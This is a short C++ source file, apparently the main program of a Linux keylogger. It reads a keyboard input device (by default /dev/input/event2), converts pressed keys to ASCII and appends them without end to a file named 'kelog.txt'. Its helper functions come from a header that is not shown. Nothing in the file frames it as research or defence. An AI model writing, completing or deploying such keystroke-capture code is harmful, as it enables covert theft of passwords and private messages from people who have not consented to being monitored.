#include <iostream>
#include "keylog.h"

using namespace std;

int main(int argc, char *argv[]) {
    string s;
    if (argc == 2) {
        s += argv[1];
    } else {
         s += "/dev/input/event2";
    }
    while (1) {
        writeToFile("kelog.txt", getAscii(getPressedKeyboardState(s)));
    }
}